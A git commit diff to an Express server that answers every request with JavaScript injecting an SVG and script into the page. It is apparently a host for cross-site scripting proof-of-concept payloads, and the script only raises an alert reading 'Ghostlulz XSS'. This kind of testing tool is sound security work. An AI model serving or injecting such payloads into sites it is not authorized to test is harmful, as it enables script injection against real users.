215251b843956b3643803f40413233d3de9a16b7
d-e-e-b <138242045+d-e-e-b@users.noreply.github.com>
2024-05-20 21:26:38 +0300

    Update index.js

--- index.js
+++ index.js
@@ -4,14 +4,14 @@ app.use('*', (req, res) => {
     console.log("Just got a request!")
 
      res.setHeader('Content-Type', 'application/javascript');
-    const data = `<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
-   <script type="text/javascript">
-      alert("Ghostlulz XSS");
-   </script>
-</svg>`;
+    const data = `
+        document.body.innerHTML += '<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="300" height="100">'
+                                + '<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />'
+                                + '<script type="text/javascript">'
+                                + '   alert("Ghostlulz XSS");'
+                                + '</script>'
+                                + '</svg>';
+    `;
     res.send(data);
 })
 app.listen(process.env.PORT || 3000)
